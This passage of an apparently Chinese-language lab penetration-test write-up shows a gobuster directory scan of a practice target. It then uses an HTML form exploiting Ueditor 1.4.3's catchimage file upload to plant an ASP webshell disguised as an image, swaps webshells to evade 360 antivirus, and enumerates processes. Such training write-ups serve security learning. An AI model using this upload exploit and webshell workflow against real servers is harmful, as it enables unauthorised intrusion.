class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://www.ackmoon.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,asp</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://www.ackmoon.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,asp</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://www.ackmoon.com/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,asp</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/03/12 22:04:37 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/images/]</span><br><span class="line">/Images               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/Images/]</span><br><span class="line">/admin                (Status: 301) [Size: 152] [--&gt; http://www.ackmoon.com/admin/] </span><br><span class="line">/member               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/member/]</span><br><span class="line">/m                    (Status: 301) [Size: 148] [--&gt; http://www.ackmoon.com/m/]     </span><br><span class="line">/template             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/template/]</span><br><span class="line">/database             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/database/]</span><br><span class="line">/js                   (Status: 301) [Size: 149] [--&gt; http://www.ackmoon.com/js/]      </span><br><span class="line">/api                  (Status: 301) [Size: 150] [--&gt; http://www.ackmoon.com/api/]     </span><br><span class="line">/M                    (Status: 301) [Size: 148] [--&gt; http://www.ackmoon.com/M/]       </span><br><span class="line">/IMAGES               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/IMAGES/]  </span><br><span class="line">/ok                   (Status: 301) [Size: 149] [--&gt; http://www.ackmoon.com/ok/]      </span><br><span class="line">/Database             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/Database/]</span><br><span class="line">/Admin                (Status: 301) [Size: 152] [--&gt; http://www.ackmoon.com/Admin/]   </span><br><span class="line">/Template             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/Template/]</span><br><span class="line">/*checkout*           (Status: 400) [Size: 3644]                                      </span><br><span class="line">/JS                   (Status: 301) [Size: 149] [--&gt; http://www.ackmoon.com/JS/]      </span><br><span class="line">/API                  (Status: 301) [Size: 150] [--&gt; http://www.ackmoon.com/API/]     </span><br><span class="line">/Member               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/Member/]  </span><br><span class="line">/*docroot*            (Status: 400) [Size: 3644]                                      </span><br><span class="line">/*                    (Status: 400) [Size: 3644]                                      </span><br><span class="line">/webservice           (Status: 301) [Size: 157] [--&gt; http://www.ackmoon.com/webservice/]</span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fwww     (Status: 400) [Size: 3644]                                        </span></span><br><span class="line">/OK                   (Status: 301) [Size: 149] [--&gt; http://www.ackmoon.com/OK/]        </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A              (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/q%</span><span class="bash">26a                (Status: 400) [Size: 3664]                                        </span></span><br><span class="line">/**http%3a            (Status: 400) [Size: 3644]                                        </span><br><span class="line">/*http%3A             (Status: 400) [Size: 3644]                                        </span><br><span class="line">/**http%3A            (Status: 400) [Size: 3644]                                        </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fyoutube (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C0.txt              (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C0.asp              (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C0                  (Status: 400) [Size: 324]                                         </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C0.html             (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblogs   (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblog    (Status: 400) [Size: 3644]                                        </span></span><br><span class="line">/**http%3A%2F%2Fwww   (Status: 400) [Size: 3644]                                        </span><br><span class="line"><span class="meta">/s%</span><span class="bash">26p                (Status: 400) [Size: 3664]                                        </span></span><br><span class="line">/WebService           (Status: 301) [Size: 157] [--&gt; http://www.ackmoon.com/WebService/]</span><br><span class="line"><span class="meta">/%</span><span class="bash">3FRID%3D2671        (Status: 400) [Size: 3644]                                        </span></span><br><span class="line">/devinmoore*          (Status: 400) [Size: 3644]                                        </span><br><span class="line">/200109*              (Status: 400) [Size: 3644]                                        </span><br><span class="line">/*sa_                 (Status: 400) [Size: 3644]                                        </span><br><span class="line">/*dc_                 (Status: 400) [Size: 3644]                                        </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fcommunity (Status: 400) [Size: 3644]                                      </span></span><br><span class="line"><span class="meta">/Chamillionaire%</span><span class="bash">20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3664]</span></span><br><span class="line"><span class="meta">/Clinton%</span><span class="bash">20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3664]</span></span><br><span class="line"><span class="meta">/DJ%</span><span class="bash">20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3664]                   </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fradar   (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D8                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CE                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CD                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CC                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CB                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D8.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CF.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CE.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CD.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CA                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CB.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CF.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CC.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D8.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CA.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CD.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CE.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D1                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D0.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CC.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CB.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CF.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D8.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CE.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CA.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CF                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CD.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D5                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D6                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D1.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D0.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D7.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CC.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CB.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CA.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D6.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D4.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D5.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D2                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D1.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D0.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D0                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D7.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D3.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D4.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D6.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C9                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D3                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D5.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D4                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D2.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D1.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C8                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C9.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D6.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D7.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D3.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D5.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D4.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D2.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C1.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D7                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C8.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C9.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D3.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D2.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C1.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C1                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C8.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C9.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C1.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C8.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C6                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C2.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C2                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C7.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C7                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C3                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C6.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C5.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C4.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C4                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C2.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C7.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D9                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C3.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C6.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C5.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C5                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C2.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C4.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C7.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D9.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C3.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C6.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C5.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C4.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D9.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C3.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D9.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DF                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DD                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DF.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DE.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DD.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DF.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DE.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DD.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DF.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DE.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DE                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DD.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DB.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DB.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DB.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DB                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/q%</span><span class="bash">26a2               (Status: 400) [Size: 3664]                                                           </span></span><br><span class="line"><span class="meta">/login%</span><span class="bash">3f             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/Shakira%</span><span class="bash">20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3664]                                        </span></span><br><span class="line">/DATABASE             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/DATABASE/]                     </span><br><span class="line">/TEMPLATE             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/TEMPLATE/]                     </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3644]                                                  </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fweblog  (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fswik    (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line">                                                                                                           </span><br><span class="line">===============================================================</span><br><span class="line">2022/03/12 22:09:32 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现后台地址</li>
+</ul>
+<p><img data-src="./ack123/3.png" alt></p>
+<ul>
+<li>这里注册一个账号为 <code>laotie233 / 123456</code></li>
+</ul>
+<p><img data-src="./ack123/4.png" alt></p>
+<h4 id="后台rce"><a href="#后台rce" class="headerlink" title="后台rce"></a>后台rce</h4><ul>
+<li>登录后台，发现如下插件 <code>Ueditor 1.4.3</code></li>
+</ul>
+<p><img data-src="./ack123/5.png" alt></p>
+<ul>
+<li>路径通过下载源码审计可以得到</li>
+</ul>
+<p><img data-src="./ack123/6.png" alt></p>
+<ul>
+<li>访问如下链接: <a href="http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage" target="_blank" rel="noopener">http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage</a>  <a href="http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage" target="_blank" rel="noopener">http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage</a></li>
+</ul>
+<p><img data-src="./ack123/7.png" alt></p>
+<ul>
+<li><p>存在文件上传rce问题(备注: 这里一直有问题，靶场环境失败，直接给作弊给shell，不纠结)</p>
+</li>
+<li><p>构造poc</p>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>  <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span>   <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"source[]"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span> &gt;</span>  <span class="tag">&lt;<span class="name">inputtype="submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>构造asp图片马(文件名改为2.jpg)，并使用恶意html进行上传</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.138/2.jpg?.aspx</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/8.png" alt></p>
+<p><img data-src="./ack123/9.png" alt></p>
+<ul>
+<li>拿到后门地址为 <code>upfiles/image/20220313/6378278920347583187225706.aspx</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ackmoon.com/upfiles/image/20220313/6378278920347583187225706.aspx</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/10.png" alt></p>
+<ul>
+<li>这里有有360杀毒，蚁剑<code>shell</code>会被干掉</li>
+</ul>
+<p><img data-src="./ack123/11.png" alt></p>
+<ul>
+<li>换一个aspx大马，可以运行指令</li>
+</ul>
+<p><img data-src="./ack123/12.png" alt></p>
+<ul>
+<li>发现为普通用户</li>
+<li>查看系统杀软信息</li>
+</ul>
+<p><img data-src="./ack123/13.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">映像名称                       PID 服务                                        </span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process              0 暂缺                                        </span><br><span class="line">System                           4 暂缺                                        </span><br><span class="line">smss.exe                       252 暂缺                                        </span><br><span class="line">csrss.exe                      352 暂缺                                        </span><br><span class="line">wininit.exe                    432 暂缺                                        </span><br><span class="line">csrss.exe                      440 暂缺                                        </span><br><span class="line">winlogon.exe                   468 暂缺                                        </span><br><span class="line">services.exe                   528 暂缺                                        </span><br><span class="line">lsass.exe                      536 SamSs, VaultSvc                             </span><br><span class="line">svchost.exe                    592 BrokerInfrastructure, DcomLaunch, LSM,      </span><br><span class="line">                                   PlugPlay, Power, SystemEventsBroker         </span><br><span class="line">svchost.exe                    620 RpcEptMapper, RpcSs                         </span><br><span class="line">dwm.exe                        712 暂缺                                        </span><br><span class="line">svchost.exe                    720 Dhcp, EventLog, lmhosts, Wcmsvc             </span><br><span class="line">svchost.exe                    796 BITS, gpsvc, IKEEXT, iphlpsvc,              </span><br><span class="line">                                   LanmanServer, ProfSvc, Schedule, seclogon,  </span><br><span class="line">                                   SENS, ShellHWDetection, Themes, Winmgmt     </span><br><span class="line">svchost.exe                    860 EventSystem, FontCache, netprofm, nsi,      </span><br><span class="line">                                   W32Time, WinHttpAutoProxySvc                </span><br><span class="line">360rps.exe                     928 360rp                                       </span><br><span class="line">svchost.exe                    996 CryptSvc, Dnscache, LanmanWorkstation,      </span><br><span class="line">                                   NlaSvc, WinRM                               </span><br><span class="line">svchost.exe                    344 BFE, DPS, MpsSvc                            </span><br><span class="line">spoolsv.exe                   1252 Spooler                                     </span><br><span class="line">svchost.exe                   1296 AppHostSvc                                  </span><br><span class="line">svchost.exe                   1316 DiagTrack                                   </span><br><span class="line">svchost.exe                   1352 ftpsvc                                      </span><br><span class="line">HwsHostSvc.exe                1392 HwsHostSvc                                  </span><br><span class="line">inetinfo.exe                  1412 IISADMIN                                    </span><br><span class="line">mysqld.exe                    1516 MySQL                                       </span><br><span class="line">Service_KMS.exe               1568 Service KMSELDI                             </span><br><span class="line">svchost.exe                   1616 Netman, TrkWks, UALSVC                      </span><br><span class="line">VGAuthService.exe             1652 VGAuthService                               </span><br><span class="line">vmtoolsd.exe                  1696 VMTools                                     </span><br><span class="line">svchost.exe                   1716 W3SVC, WAS                                  </span><br><span class="line">svchost.exe                   1964 PolicyAgent                                 </span><br><span class="line">WmiPrvSE.exe                  1784 暂缺                                        </span><br><span class="line">dllhost.exe                   2100 COMSysApp                                   </span><br><span class="line">msdtc.exe                     2308 MSDTC                                       </span><br><span class="line">WmiPrvSE.exe                  2488 暂缺                                        </span><br><span class="line">taskhostex.exe                2300 暂缺                                        </span><br><span class="line">explorer.exe                  1372 暂缺                                        </span><br><span class="line">360sd.exe                     2560 暂缺                                        </span><br><span class="line">ChsIME.exe                    3036 暂缺                                        </span><br><span class="line">dllhost.exe                   1704 暂缺                                        </span><br><span class="line">vm3dservice.exe                924 暂缺                                        </span><br><span class="line">vmtoolsd.exe                   156 暂缺                                        </span><br><span class="line">HwsHostPanel.exe              2240 暂缺                                        </span><br><span class="line">HwsHostMaster.exe             4784 暂缺                                        </span><br><span class="line">hws.exe                       4824 hws                                         </span><br><span class="line">WinSW.exe                     8596 frp                                         </span><br><span class="line">frpc.exe                      6876 暂缺                                        </span><br><span class="line">conhost.exe                   9140 暂缺                                        </span><br><span class="line">powershell.exe                9888 暂缺                                        </span><br><span class="line">conhost.exe                   6908 暂缺                                        </span><br><span class="line">multitip.exe                  8772 暂缺                                        </span><br><span class="line">360rp.exe                    13188 暂缺                                        </span><br><span class="line">w3wp.exe                     14204 暂缺                                        </span><br><span class="line">cmd.exe                       4420 暂缺                                        </span><br><span class="line">conhost.exe                   1368 暂缺                                        </span><br><span class="line">cmd.exe                      14528 暂缺                                        </span><br><span class="line">conhost.exe                  14920 暂缺                                        </span><br><span class="line">cmd.exe                      14512 暂缺                                        </span><br><span class="line">conhost.exe                  